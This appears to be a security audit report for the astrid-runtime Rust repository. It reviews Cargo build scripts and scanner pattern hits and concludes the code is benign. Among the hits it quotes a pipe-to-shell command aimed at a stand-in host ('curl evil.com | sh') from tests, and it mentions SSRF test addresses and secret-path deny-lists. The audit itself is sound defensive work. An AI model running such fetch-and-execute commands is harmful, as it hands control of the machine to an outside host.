# Malicious-code audit — astrid-runtime/astrid @ 6de3fd3b

Tool: `python3 tools/audit_repo.py /home/user/work/astrid`, then manual review.

## Build/test hooks (run on `cargo build/test`)
- `crates/astrid-capsule/build.rs` — sets `TARGET` env and copies `wit/host/*.wit` into `wit-staging/deps/` (local fs only, no network, no process spawn). In a clone without the `wit` submodule it skips staging. Benign.
- `crates/astrid-gateway/build.rs` — runs `git rev-parse --short=12 HEAD` and `$RUSTC --version` (2 s timeout) for build provenance metrics. Benign. Not in the astrid-capsule dependency graph anyway.
- `crates/astrid-storage-chunker-evidence/build.rs` — runs `$RUSTC --version`, emits HOST/TARGET env vars. Benign.
- Other `build.rs` hits (`astrid-cli/src/build.rs`, `astrid-cli/src/commands/capsule/build.rs`, `astrid-build/src/build.rs`) are ordinary source modules named build.rs, not Cargo build scripts.
- No `.cargo/config.toml` (only `.cargo/audit.toml`), no npm lifecycle hooks, no committed binaries.

## Pattern hits (all reviewed, all benign)
- pipe-to-shell: rustup install hint string in `capsule new` output; test fixtures asserting `curl evil.com | sh` is *not* auto-approved.
- long hex/base64: storage test vectors and a sigstore bundle fixture.
- raw-ip-url: SSRF test cases (169.254.169.254, 8.8.8.8) in HTTP egress tests.
- powershell-download: Windows CI step in `.github/workflows/ci.yml` (not executed locally).
- env-dump: a shell test script copying `os.environ` for subprocess env.
- secret-paths: sandbox deny-list entries / doc comments.

## Verdict
No malicious code found. Safe to run `cargo test/clippy/fmt` for `astrid-capsule` / `astrid-capsule-types` locally.
